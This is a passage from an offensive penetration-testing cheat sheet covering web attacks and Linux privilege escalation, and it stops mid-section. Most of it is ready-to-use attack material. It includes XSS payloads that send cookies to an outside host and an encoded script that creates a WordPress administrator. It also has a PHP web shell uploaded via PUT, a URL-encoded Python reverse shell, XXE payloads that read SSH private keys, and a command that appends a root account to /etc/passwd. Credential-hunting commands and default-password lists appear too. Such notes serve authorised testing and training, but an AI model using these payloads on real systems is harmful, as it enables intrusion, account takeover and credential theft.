- Test insecure update mechanisms, local file storage, and client-side authorization.

```cmd
strings64.exe .\client.exe
dir C:\Users\<USER>\AppData\Local\Temp
```

```bash
jar -xf client.jar
grep -R "password\|api_key\|secret" .
```

#### Web Mass Assignment

Add privileged fields to JSON/form bodies and observe whether the server accepts them:

```json
{
  "username": "user",
  "password": "<PASSWORD>",
  "email": "<EMAIL>",
  "is_admin": true,
  "role": "admin",
  "verified": true
}
```

Test registration, profile update, password reset, and API endpoints. Use Burp Repeater/Intruder to add fields one at a time.

#### Application Hardening

- Patch applications and remove default/example apps.
- Restrict admin interfaces by network or SSO.
- Enforce least privilege for service accounts and database users.
- Validate and allowlist mass-assignment fields.
- Disable directory listing and unnecessary HTTP methods.
- Monitor application logs and upload directories.

### Applications Connecting to Services

Many applications connect to databases, LDAP/AD, SMTP, caching, or internal APIs. These connections are often configured with reusable credentials or over-privileged accounts.

- Jenkins — LDAP/AD, SMTP, cloud credentials, build secrets.
- GitLab — PostgreSQL, Redis, SMTP, object storage.
- Tomcat — JDBC realm, JNDI resources, manager accounts.
- Splunk — LDAP, indexer connections, app secrets.
- osTicket — MySQL, SMTP, help-desk integrations.
- WordPress/Joomla/Drupal — database credentials in config files.

```bash
# Look for configuration and environment files
grep -RniE "password|passwd|secret|token|api[_-]?key" /var/www /opt /etc 2>/dev/null
find / -name "*.env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null

# Check exposed admin interfaces and default credentials
curl -s http://<TARGET>/jenkins/
curl -s http://<TARGET>/gitlab/
```

Test whether the application can reach internal services (SSRF), whether its service account is over-privileged, and whether configuration files are readable. Reuse discovered credentials only within the authorized scope.

### Set Proxy Environment Variables

```shell
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

### WebDAV (cadaver)

```shell
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

```shell
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

```
davtest -cleanup -url http://target
cadaver http://target
```

### Cross-Site Scripting (XSS)

```javascript
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

#### XSS client-Side Attack

#### Request Example

```javascript
<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
```

#### Get nonce

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

#### Update Payload Script

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### Compress Payload Script

> https://jscompress.com/

```javascript
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

#### Encoding Function

```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }

let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

#### Encoded Payload

```shell
118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
```

#### Execution

```shell
curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
))</script>" --proxy 127.0.0.1:8080
```

### GitTools

```shell
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

### Local File Inclusion (LFI)

```shell
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

#### Until php 5.3

```shell
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

#### Null Byte

```shell
%00
0x00
```

#### Encoded Traversal Strings

```shell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

#### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```shell
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```shell
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

#### Django, Rails, or Node.js Web Application Header Values

```shell
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

#### Linux Files

```shell
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

#### Windows Files

```shell
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

### PHP Upload Filter Bypasses

```shell
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.phps
.phar
.phpt
.pgif
.phtm
.php%00.jpeg
```

```shell
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

### PHP Generic Gadget Chains (PHPGGC)

```shell
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

### Server-Side Request Forgery (SSRF)

```shell
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

### Server-Side Template Injection (SSTI)

#### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```shell
${{<%[%'"}}%\.
```

#### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```shell
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

### Upload Vulnerabilities

```shell
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

### XML External Entity (XXE)

#### Skeleton Payload Request

```shell
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

#### Payloads

```shell
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```shell
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```shell
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

### Web Server Enumeration (80/tcp)

- Basics:
  - Navigate && robots.txt
  - Headers
  - Source Code (Read for comments)
  - Pay attention to errors (Is there a protocol relationship)

```
# Nikto
nikto -h http://10.11.1.111

# Nikto with squid proxy
nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444

# CMS Explorer
cms-explorer -url http://10.11.1.111 -type [Drupal, WordPress, Joomla, Mambo]

# Wordpress Techniques
Ref: Maria, Fail, Shenzi, Nukem
https://www.hackingarticles.in/wordpress-reverse-shell/

http://192.168.137.167/wp-content/themes/twentynineteen/404.php # Url to execute reverse shell

Note: Use 'grep -R backup_scripts 2>/dev/null' to look for cron related directories.

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.11.1.111
wpscan --url http://10.11.1.111 --enumerate vp
wpscan --url http://192.168.221.167/ -e u,ap --plugins-detection aggressive
wpscan --url http://10.11.1.111 --enumerate vt
wpscan --url http://10.11.1.111 --enumerate u
wpscan -e --url https://url.com

Check IP behing WAF:
https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
   <string>https://IP.com/2020/01/22/hello-world/</string>
</params>
</methodCall>

curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php

Enum User:
for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done

# Joomscan
joomscan -u  http://10.11.1.111
joomscan -u  http://10.11.1.111 --enumerate-components

# Get header
curl -i 10.11.1.111

# Get options
curl -i -X OPTIONS 10.11.1.111

	# With PUT option enabled:
	nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
	&& http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L 10.11.1.111
curl -i -H "User-Agent:Mozilla/4.0" http://10.11.1.111:8080

# Check for title and all links
curl 10.11.1.111 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.11.1.111 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=<PASSWORD>

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

site:domain.com intext:user

# Firebase
https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file
```

### Default & Weak Logins

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin / admin
admin / password
admin / admin12345
admin / letmeinplease
admin / <blank>
admin / <servicename>
admin / <name of the box>
administrator / admin
user / user
user / 12345
user / password
guest / guest
root / root
root / admin
root / password
root / <servicename>
<username if you have> / password
<username if you have> / admin
<username if you have> / username
username / <servicename>
<name of the box> / <name of the box>
<name of the service / application> <name of the service / application>
default account / <name of the application>
```

## 13. Linux Privilege Escalation

> Condensed from HackTheBox Academy **Linux Privilege Escalation** (module 51). This is a command-oriented reference, not a copy of the course text. Lab credentials, hashes, flags, and assessment answers are intentionally omitted — replace placeholders such as `<ATTACKER_IP>`, `<TARGET>`, `<USER>`, and `<PASSWORD>` before use.

### Quick Checks

```bash
id
sudo -l
uname -a
cat /etc/os-release
hostname
ps aux
ss -tulpn

# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
ls -la /etc/cron* /var/spool/cron 2>/dev/null
cat /etc/crontab

# Writable files and directories
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null
find / -path /proc -prune -o -type d -perm -o+w -print 2>/dev/null
```

Automated helpers: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinEnum](https://github.com/rebootuser/LinEnum), [pspy](https://github.com/DominicBreuker/pspy), [GTFOBins](https://gtfobins.github.io/).

### Information Gathering

#### Environment Enumeration

```bash
# OS, kernel, and architecture
cat /etc/os-release
uname -a
lscpu

# Current user, groups, PATH, and environment
id
echo $PATH
env
cat /etc/shells

# Users and groups
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
grep "sh$" /etc/passwd
cat /etc/group
getent group sudo
ls /home

# Disks and mounts
lsblk
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
df -h

# Network
ip a
route
arp -a
cat /etc/hosts

# Hidden files and directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep "$USER"
find / -type d -name ".*" -ls 2>/dev/null
ls -l /tmp /var/tmp /dev/shm
```

#### Services & Internals Enumeration

```bash
# Logged-in and recent users
w
lastlog

# Command history
history
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null

# Scheduled tasks
ls -la /etc/cron.daily/ /etc/cron.d/ /var/spool/cron 2>/dev/null

# Processes and command lines
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Installed packages, binaries, and sudo version
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
sudo -V

# Interesting files
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# Cross-check installed binaries against GTFOBins
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi
done
```

#### Credential Hunting

```bash
# Configuration files that may contain secrets
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" \) 2>/dev/null

# Web application configuration (example: WordPress)
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Shell history and SSH material
cat ~/.bash_history
ls -la ~/.ssh
cat ~/.ssh/known_hosts
```

Look in `/var/www`, mail spools, backups, database files, `.git` directories, and world-readable scripts. Check whether discovered credentials are reused for `su`, `sudo`, SSH, or other hosts.

#### CentOS

```shell
doas -u <USERNAME> /bin/sh
```

#### Environment Variables

```shell
export PATH=`pwd`:$PATH
```

#### gcc

```shell
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

#### getfacl

```shell
getfacl <LOCAL_DIRECTORY>
```

#### iconv

```shell
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

#### vi

```shell
:w !sudo tee %    # save file with elevated privileges without exiting
```

#### Windows Command Formatting

#### Basic Linux Enumeration

```shell
env
cat ~/.bashrc
cat /etc/passwd
cat /etc/hosts
cat /etc/fstab
lsblk
ls -lah /etc/cron*
crontab -l
sudo crontab -l
crontab -u <USERNAME> -l
grep "CRON" /var/log/syslog
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
dpkg -l
uname -a
```

#### Abusing Password Authentication

```shell
openssl passwd <PASSWORD>
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

#### Apache2

#### Read first Line of a File with apache2 Binary

```shell
sudo /usr/sbin/apache2 -f <FILE>
```

#### APT

```shell
